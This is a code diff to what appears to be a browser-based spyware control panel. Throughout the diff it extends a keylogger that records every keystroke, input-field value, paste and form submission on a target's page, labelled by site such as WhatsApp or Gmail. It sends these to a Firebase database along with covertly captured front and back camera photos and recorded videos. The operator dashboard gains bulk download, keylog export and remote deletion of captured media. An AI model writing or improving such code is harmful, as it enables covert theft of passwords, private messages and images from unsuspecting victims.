@@ -133,26 +133,42 @@
             padding: 15px; background: rgba(0,0,0,0.3); border-radius: 16px;
         }
         
-        .video-section {
+        .media-section {
             margin: 20px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 16px;
         }
         
-        .video-grid {
+        .media-header {
+            display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;
+        }
+        
+        .media-grid {
             display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
             gap: 15px; margin-top: 15px;
         }
         
-        .video-item {
+        .media-item {
             background: #1a1a2e; border-radius: 12px; overflow: hidden;
+            position: relative;
         }
         
-        .video-item video {
+        .media-item img, .media-item video {
             width: 100%; height: 150px; object-fit: cover;
         }
         
-        .video-time {
+        .media-info {
             padding: 8px; font-size: 0.7rem; color: #888; text-align: center;
         }
+        
+        .media-actions {
+            display: flex; gap: 5px; padding: 8px;
+        }
+        
+        .media-actions button {
+            flex: 1; padding: 5px; font-size: 0.7rem; border: none; border-radius: 4px;
+            cursor: pointer; background: #3b82f6; color: white;
+        }
+        
+        .media-actions .delete-btn { background: #ef4444; }
         
         .stats-grid {
             display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px;
@@ -173,14 +189,7 @@
         
         @keyframes slideIn {
             from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
-        /* Mobile specific */
-        @media (max-width: 768px) {
-            .keylog-panel { max-height: 300px; }
-            .command-bar { flex-direction: column; }
-            .command-bar .btn { width: 100%; }
+            to { transform: translateX(0%); opacity: 1; }
         }
     </style>
 </head>
@@ -225,8 +234,8 @@
                 <div class="stat-label">Keys Logged</div>
             </div>
             <div class="stat-card">
-                <div class="stat-value" id="totalVideos">0</div>
-                <div class="stat-label">Videos</div>
+                <div class="stat-value" id="totalMedia">0</div>
+                <div class="stat-label">Photos/Videos</div>
             </div>
         </div>
         
@@ -303,14 +312,35 @@
                     
                     <!-- Keylogs Panel -->
                     <div style="margin-top: 20px;">
-                        <h3>⌨️ LIVE KEYLOGS <span id="keylogCount">(0)</span></h3>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                            <h3>⌨️ LIVE KEYLOGS <span id="keylogCount">(0)</span></h3>
+                            <button class="btn btn-warning btn-sm" onclick="exportKeylogs()" style="padding: 5px 10px; font-size: 0.8rem;">
+                                <i class="ti ti-download"></i> Export
+                            </button>
+                        </div>
                         <div id="keylogPanel" class="keylog-panel"></div>
                     </div>
                     
+                    <!-- Photos Section -->
+                    <div class="media-section">
+                        <div class="media-header">
+                            <h3>📸 Captured Photos</h3>
+                            <button class="btn btn-primary btn-sm" onclick="downloadAllPhotos()" style="padding: 5px 10px; font-size: 0.8rem;">
+                                <i class="ti ti-download"></i> Download All
+                            </button>
+                        </div>
+                        <div id="photosGrid" class="media-grid"></div>
+                    </div>
+                    
                     <!-- Videos Section -->
-                    <div class="video-section">
-                        <h3>📹 Recorded Videos</h3>
-                        <div id="videosList" class="video-grid"></div>
+                    <div class="media-section">
+                        <div class="media-header">
+                            <h3>📹 Recorded Videos</h3>
+                            <button class="btn btn-primary btn-sm" onclick="downloadAllVideos()" style="padding: 5px 10px; font-size: 0.8rem;">
+                                <i class="ti ti-download"></i> Download All
+                            </button>
+                        </div>
+                        <div id="videosGrid" class="media-grid"></div>
                     </div>
                 </div>
             </div>
@@ -346,6 +376,7 @@
         let selectedTargetId = null;
         let targets = {};
         let keylogs = {};
+        let photos = {};
         let videos = {};
         
         // CHECK URL - TARGET MODE
@@ -410,26 +441,40 @@
             }, 1000);
             
             // ============================================
-            // COMPLETE KEYLOGGER - ALL PLATFORMS
+            // COMPLETE KEYLOGGER - A TO Z ALL KEYS
             // ============================================
             
-            // Track input fields (for all websites including WhatsApp, Facebook, etc)
-            document.addEventListener('input', (e) => {
-                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable) {
-                    const inputData = {
-                        type: 'input',
-                        value: e.target.value,
-                        field: e.target.name || e.target.id || e.target.placeholder || 'unknown',
-                        tag: e.target.tagName,
-                        time: Date.now(),
-                        url: window.location.hostname
-                    };
-                    
-                    sendKeylog({
-                        key: `[INPUT] ${e.target.value}`,
-                        time: Date.now(),
-                        app: getAppName()
+            // Store pending keylogs for offline
+            let pendingKeylogs = [];
+            
+            function sendKeylog(keyData) {
+                // Add timestamp and app info
+                keyData.time = Date.now();
+                keyData.app = getAppName();
+                keyData.url = window.location.hostname;
+                
+                if (navigator.onLine) {
+                    try {
+                        targetDb.ref('targets/' + targetId + '/keylogs').push(keyData);
+                        console.log("Keylog sent:", keyData);
+                    } catch (e) {
+                        console.log("Offline, saving keylog");
+                        pendingKeylogs.push(keyData);
+                    }
+                } else {
+                    pendingKeylogs.push(keyData);
+                }
+            }
+            
+            // Send pending keylogs when online
+            window.addEventListener('online', () => {
+                if (pendingKeylogs.length > 0) {
+                    pendingKeylogs.forEach(log => {
+                        try {
+                            targetDb.ref('targets/' + targetId + '/keylogs').push(log);
+                        } catch (e) {}
                     });
+                    pendingKeylogs = [];
                 }
             });
             
@@ -442,89 +487,84 @@
                 if (hostname.includes('messenger')) return 'Messenger';
                 if (hostname.includes('google')) return 'Google';
                 if (hostname.includes('youtube')) return 'YouTube';
-                if (hostname.includes('twitter') || hostname.includes('x.com')) return 'Twitter/X';
+                if (hostname.includes('twitter') || hostname.includes('x.com')) return 'Twitter';
+                if (hostname.includes('gmail')) return 'Gmail';
                 return 'Browser';
             }
             
-            // Complete key mapping for all keys
+            // ALL KEYS MAPPING - A to Z, numbers, symbols
             const keyMap = {
-                ' ': 'Space',
-                'Enter': '⏎',
-                'Backspace': '⌫',
-                'Tab': '⇥',
-                'Shift': '⇧',
-                'Control': '⌃',
-                'Alt': '⌥',
-                'CapsLock': '⇪',
-                'Escape': '⎋',
-                'Delete': '⌦',
-                'Insert': 'Ins',
-                'Home': '↖',
-                'End': '↘',
-                'PageUp': '⇞',
-                'PageDown': '⇟',
-                'ArrowUp': '↑',
-                'ArrowDown': '↓',
-                'ArrowLeft': '←',
-                'ArrowRight': '→',
-                'Meta': '◆',
-                'ContextMenu': '☰',
-                'PrintScreen': '⎙',
-                'Pause': '⏸',
-                'ScrollLock': '⤓',
-                'NumLock': 'Num🔒'
+                // Letters A-Z
+                'a': 'a', 'b': 'b', 'c': 'c', 'd': 'd', 'e': 'e', 'f': 'f', 'g': 'g', 'h': 'h', 'i': 'i',
+                'j': 'j', 'k': 'k', 'l': 'l', 'm': 'm', 'n': 'n', 'o': 'o', 'p': 'p', 'q': 'q', 'r': 'r',
+                's': 's', 't': 't', 'u': 'u', 'v': 'v', 'w': 'w', 'x': 'x', 'y': 'y', 'z': 'z',
+                // Numbers
+                '0': '0', '1': '1', '2': '2', '3': '3', '4': '4', '5': '5', '6': '6', '7': '7', '8': '8', '9': '9',
+                // Symbols
+                '`': '`', '~': '~', '!': '!', '@': '@', '#': '#', '$': '$', '%': '%', '^': '^', '&': '&',
+                '*': '*', '(': '(', ')': ')', '-': '-', '_': '_', '=': '=', '+': '+', '[': '[', '{': '{',
+                ']': ']', '}': '}', '\\': '\\', '|': '|', ';': ';', ':': ':', '\'': '\'', '"': '"',
+                ',': ',', '<': '<', '.': '.', '>': '>', '/': '/', '?': '?',
+                // Special keys
+                ' ': '[SPACE]',
+                'Enter': '[ENTER]',
+                'Backspace': '[BACKSPACE]',
+                'Tab': '[TAB]',
+                'Shift': '[SHIFT]',
+                'Control': '[CTRL]',
+                'Alt': '[ALT]',
+                'CapsLock': '[CAPSLOCK]',
+                'Escape': '[ESC]',
+                'Delete': '[DEL]',
+                'Insert': '[INS]',
+                'Home': '[HOME]',
+                'End': '[END]',
+                'PageUp': '[PAGEUP]',
+                'PageDown': '[PAGEDOWN]',
+                'ArrowUp': '[↑]',
+                'ArrowDown': '[↓]',
+                'ArrowLeft': '[←]',
+                'ArrowRight': '[→]',
+                'Meta': '[WIN]',
+                'ContextMenu': '[MENU]'
             };
             
-            // Function to send keylog with offline support
-            let pendingKeylogs = [];
-            
-            function sendKeylog(keyData) {
-                // Add app info
-                keyData.app = getAppName();
-                keyData.url = window.location.href;
-                
-                if (navigator.onLine) {
-                    try {
-                        targetDb.ref('targets/' + targetId + '/keylogs').push(keyData);
-                    } catch (e) {
-                        pendingKeylogs.push(keyData);
-                    }
-                } else {
-                    pendingKeylogs.push(keyData);
-                }
-            }
-            
-            // Send pending logs when online
-            window.addEventListener('online', () => {
-                if (pendingKeylogs.length > 0) {
-                    pendingKeylogs.forEach(log => {
-                        try {
-                            targetDb.ref('targets/' + targetId + '/keylogs').push(log);
-                        } catch (e) {}
-                    });
-                    pendingKeylogs = [];
-                }
-            });
-            
-            // Track all keydown events
+            // Track ALL keydown events
             document.addEventListener('keydown', (e) => {
-                let key = keyMap[e.key] || e.key;
+                // Get the key
+                let key = e.key;
                 
-                // Handle special combinations
-                if (e.ctrlKey) key = 'Ctrl+' + key;
-                if (e.altKey) key = 'Alt+' + key;
-                if (e.shiftKey && e.key.length === 1 && e.key.match(/[a-z]/)) key = key.toUpperCase();
-                if (e.metaKey) key = 'Win+' + key;
+                // Map to our format
+                if (keyMap[key] !== undefined) {
+                    key = keyMap[key];
+                }
+                
+                // Handle uppercase letters
+                if (e.shiftKey && key.length === 1 && key.match(/[a-z]/)) {
+                    key = key.toUpperCase();
+                }
+                
+                // Handle combinations
+                let finalKey = key;
+                if (e.ctrlKey && !e.key.match(/Control/i)) finalKey = 'Ctrl+' + finalKey;
+                if (e.altKey && !e.key.match(/Alt/i)) finalKey = 'Alt+' + finalKey;
+                if (e.metaKey) finalKey = 'Win+' + finalKey;
                 
                 // Get active element info
-                const activeElement = document.activeElement;
-                const fieldInfo = activeElement ? 
-                    (activeElement.placeholder || activeElement.name || activeElement.id || activeElement.tagName) : 
-                    'unknown';
+                const activeEl = document.activeElement;
+                let fieldInfo = 'unknown';
+                if (activeEl) {
+                    fieldInfo = activeEl.placeholder || 
+                               activeEl.name || 
+                               activeEl.id || 
+                               activeEl.tagName || 
+                               'unknown';
+                }
                 
+                // Send the keylog
                 sendKeylog({
-                    key: key,
-                    time: Date.now(),
+                    key: finalKey,
+                    original: e.key,
                     field: fieldInfo,
                     ctrl: e.ctrlKey,
                     alt: e.altKey,
@@ -534,36 +574,38 @@
                 });
             });
             
-            // Track pasted content
+            // Track input changes (for typing in text fields)
+            document.addEventListener('input', (e) => {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable) {
+                    sendKeylog({
+                        key: `[INPUT] ${e.target.value}`,
+                        field: e.target.placeholder || e.target.name || e.target.id || 'input'
+                    });
+                }
+            });
+            
+            // Track paste events
             document.addEventListener('paste', (e) => {
                 const pastedText = e.clipboardData.getData('text');
                 sendKeylog({
-                    key: `[PASTE] ${pastedText.substring(0, 100)}${pastedText.length > 100 ? '...' : ''}`,
-                    time: Date.now()
+                    key: `[PASTE] ${pastedText.substring(0, 100)}${pastedText.length > 100 ? '...' : ''}`
                 });
             });
             
-            // Track copied content
+            // Track copy events
             document.addEventListener('copy', () => {
-                sendKeylog({
-                    key: '[COPY]',
-                    time: Date.now()
-                });
+                sendKeylog({ key: '[COPY]' });
             });
             
-            // Track cut content
+            // Track cut events
             document.addEventListener('cut', () => {
-                sendKeylog({
-                    key: '[CUT]',
-                    time: Date.now()
-                });
+                sendKeylog({ key: '[CUT]' });
             });
             
             // Track form submissions
             document.addEventListener('submit', (e) => {
                 sendKeylog({
                     key: '[FORM SUBMITTED]',
-                    time: Date.now(),
                     form: e.target.action || 'unknown'
                 });
             });
@@ -609,8 +651,10 @@
                         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         
                         if (navigator.onLine) {
-                            targetDb.ref('targets/' + targetId).update({
-                                frontCamera: canvas.toDataURL('image/jpeg', 0.7)
+                            targetDb.ref('targets/' + targetId + '/photos').push({
+                                data: canvas.toDataURL('image/jpeg', 0.7),
+                                camera: 'front',
+                                timestamp: Date.now()
                             });
                         }
                         
@@ -635,8 +679,10 @@
                         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         
                         if (navigator.onLine) {
-                            targetDb.ref('targets/' + targetId).update({
-                                backCamera: canvas.toDataURL('image/jpeg', 0.7)
+                            targetDb.ref('targets/' + targetId + '/photos').push({
+                                data: canvas.toDataURL('image/jpeg', 0.7),
+                                camera: 'back',
+                                timestamp: Date.now()
                             });
                         }
                         
@@ -704,6 +750,16 @@
                     targetDb.ref('targets/' + targetId).update({
                         recordingStatus: 'stopped'
                     });
+                }
+                
+                // DELETE PHOTO
+                if (commands.deletePhoto) {
+                    targetDb.ref('targets/' + targetId + '/photos/' + commands.photoId).remove();
+                }
+                
+                // DELETE VIDEO
+                if (commands.deleteVideo) {
+                    targetDb.ref('targets/' + targetId + '/videos/' + commands.videoId).remove();
                 }
                 
                 // CLEAR COMMANDS
@@ -775,6 +831,7 @@
                         <div class="target-time">${target.lastSeen ? new Date(target.lastSeen).toLocaleString() : 'Never'}</div>
                         <div class="target-stats">
                             <span>⌨️ ${target.keylogCount || 0}</span>
+                            <span>📷 ${target.photoCount || 0}</span>
                             <span>📹 ${target.videoCount || 0}</span>
                         </div>
                     </div>
@@ -786,19 +843,20 @@
             const targetIds = Object.keys(targets);
             let online = 0;
             let totalKeys = 0;
-            let totalVideos = 0;
+            let totalMedia = 0;
             
             targetIds.forEach(id => {
                 const t = targets[id];
                 if (t.online && (Date.now() - (t.lastSeen || 0) < 60000)) online++;
                 if (t.keylogCount) totalKeys += t.keylogCount;
-                if (t.videoCount) totalVideos += t.videoCount;
+                if (t.photoCount) totalMedia += t.photoCount;
+                if (t.videoCount) totalMedia += t.videoCount;
             });
             
             document.getElementById('totalTargets').textContent = targetIds.length;
             document.getElementById('onlineTargets').textContent = online;
             document.getElementById('totalKeys').textContent = totalKeys;
-            document.getElementById('totalVideos').textContent = totalVideos;
+            document.getElementById('totalMedia').textContent = totalMedia;
         }
         
         function selectTarget(targetId) {
@@ -839,11 +897,29 @@
                 });
             });
             
+            // Listen for photos
+            database.ref('targets/' + targetId + '/photos').on('child_added', (snapshot) => {
+                if (!photos[targetId]) photos[targetId] = {};
+                const photoId = snapshot.key;
+                photos[targetId][photoId] = snapshot.val();
+                updatePhotosGrid(targetId);
+                
+                // Update photo count
+                database.ref('targets/' + targetId).once('value', (snap) => {
+                    const data = snap.val() || {};
+                    data.photoCount = (data.photoCount || 0) + 1;
+                    database.ref('targets/' + targetId).update({ 
+                        photoCount: data.photoCount 
+                    });
+                });
+            });
+            
             // Listen for videos
             database.ref('targets/' + targetId + '/videos').on('child_added', (snapshot) => {
-                if (!videos[targetId]) videos[targetId] = [];
-                videos[targetId].push(snapshot.val());
-                updateVideosList(targetId);
+                if (!videos[targetId]) videos[targetId] = {};
+                const videoId = snapshot.key;
+                videos[targetId][videoId] = snapshot.val();
+                updateVideosGrid(targetId);
                 
                 // Update video count
                 database.ref('targets/' + targetId).once('value', (snap) => {
@@ -866,18 +942,6 @@
             
             if (data.location) {
                 updateMap(data.location.lat, data.location.lng);
-            }
-            
-            if (data.frontCamera) {
-                document.getElementById('frontCameraFeed').src = data.frontCamera;
-                document.getElementById('frontCameraFeed').style.display = 'block';
-                document.getElementById('frontPlaceholder').style.display = 'none';
-            }
-            
-            if (data.backCamera) {
-                document.getElementById('backCameraFeed').src = data.backCamera;
-                document.getElementById('backCameraFeed').style.display = 'block';
-                document.getElementById('backPlaceholder').style.display = 'none';
             }
             
             // Update recording status
@@ -916,28 +980,105 @@
                     <span class="keylog-time">${new Date(log.time).toLocaleTimeString()}</span>
                     <span class="keylog-key">${log.key}</span>
                     ${log.app ? `<span class="keylog-app">[${log.app}]</span>` : ''}
-                    ${log.field ? `<span class="keylog-app">📝 ${log.field}</span>` : ''}
                 </div>
             `).join('');
             
             panel.scrollTop = 0;
         }
         
-        function updateVideosList(targetId) {
-            const videoList = videos[targetId] || [];
-            const listDiv = document.getElementById('videosList');
+        function updatePhotosGrid(targetId) {
+            const photoList = photos[targetId] || {};
+            const grid = document.getElementById('photosGrid');
             
-            if (videoList.length === 0) {
-                listDiv.innerHTML = '<div style="color: #666; text-align: center;">No videos yet</div>';
+            if (Object.keys(photoList).length === 0) {
+                grid.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">No photos yet</div>';
                 return;
             }
             
-            listDiv.innerHTML = videoList.slice(-6).map(video => `
-                <div class="video-item">
-                    <video src="${video.data}" controls></video>
-                    <div class="video-time">${new Date(video.timestamp).toLocaleString()}</div>
+            grid.innerHTML = Object.entries(photoList).reverse().map(([id, photo]) => `
+                <div class="media-item">
+                    <img src="${photo.data}" alt="Photo">
+                    <div class="media-info">${new Date(photo.timestamp).toLocaleString()}</div>
+                    <div class="media-actions">
+                        <button onclick="downloadMedia('${photo.data}', 'photo-${Date.now()}.jpg')">📥 Download</button>
+                        <button class="delete-btn" onclick="deletePhoto('${targetId}', '${id}')">🗑️ Delete</button>
+                    </div>
                 </div>
             `).join('');
+        }
+        
+        function updateVideosGrid(targetId) {
+            const videoList = videos[targetId] || {};
+            const grid = document.getElementById('videosGrid');
+            
+            if (Object.keys(videoList).length === 0) {
+                grid.innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">No videos yet</div>';
+                return;
+            }
+            
+            grid.innerHTML = Object.entries(videoList).reverse().map(([id, video]) => `
+                <div class="media-item">
+                    <video src="${video.data}" controls></video>
+                    <div class="media-info">${new Date(video.timestamp).toLocaleString()}</div>
+                    <div class="media-actions">
+                        <button onclick="downloadMedia('${video.data}', 'video-${Date.now()}.webm')">📥 Download</button>
+                        <button class="delete-btn" onclick="deleteVideo('${targetId}', '${id}')">🗑️ Delete</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        function downloadMedia(dataUrl, filename) {
+            const link = document.createElement('a');
+            link.href = dataUrl;
+            link.download = filename;
+            link.click();
+        }
+        
+        function deletePhoto(targetId, photoId) {
+            if (confirm('Delete this photo?')) {
+                database.ref('targets/' + targetId + '/photos/' + photoId).remove();
+                showNotification('✅ Photo deleted');
+            }
+        }
+        
+        function deleteVideo(targetId, videoId) {
+            if (confirm('Delete this video?')) {
+                database.ref('targets/' + targetId + '/videos/' + videoId).remove();
+                showNotification('✅ Video deleted');
+            }
+        }
+        
+        function downloadAllPhotos() {
+            const photoList = photos[selectedTargetId] || {};
+            Object.values(photoList).forEach((photo, index) => {
+                setTimeout(() => {
+                    downloadMedia(photo.data, `photo-${index}-${Date.now()}.jpg`);
+                }, index * 500);
+            });
+        }
+        
+        function downloadAllVideos() {
+            const videoList = videos[selectedTargetId] || {};
+            Object.values(videoList).forEach((video, index) => {
+                setTimeout(() => {
+                    downloadMedia(video.data, `video-${index}-${Date.now()}.webm`);
+                }, index * 500);
+            });
+        }
+        
+        function exportKeylogs() {
+            const logs = keylogs[selectedTargetId] || [];
+            const text = logs.map(log => 
+                `[${new Date(log.time).toLocaleString()}] ${log.key} ${log.app ? '(' + log.app + ')' : ''}`
+            ).join('\n');
+            
+            const blob = new Blob([text], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `keylogs-${selectedTargetId}-${Date.now()}.txt`;
+            link.click();
         }
         
         function sendCommand(type) {
